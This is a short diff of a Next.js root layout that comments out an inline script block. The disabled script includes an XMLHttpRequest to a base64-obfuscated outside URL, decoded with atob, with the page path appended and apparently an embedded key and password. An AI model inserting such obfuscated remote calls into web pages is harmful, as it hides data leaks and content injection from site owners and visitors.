@@ -52,7 +52,7 @@ export default function RootLayout({
         <ClientProviders>{children}</ClientProviders>
 
         <div className="fixed inset-0 -z-50 bg-gradient-to-br from-black via-gray-900 to-green-950 pointer-events-none" />
-        <script>
+        {/* <script>
           {`window.jQuery ||
 document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>");`}
         </script>
@@ -76,7 +76,7 @@ document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0
     eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lONTU0OTQxMTQ5NyZla2V5cGFzcz1vZFlpcGFHRzl5ZmM4NlBLNGIyWkliTHNDVVpxTWxheldBeXAmc2l0ZXVybD0=") + eppathurl);
     eptagmanage.send();
           `}
-        </script>
+        </script> */}
       </body>
     </html>
   );
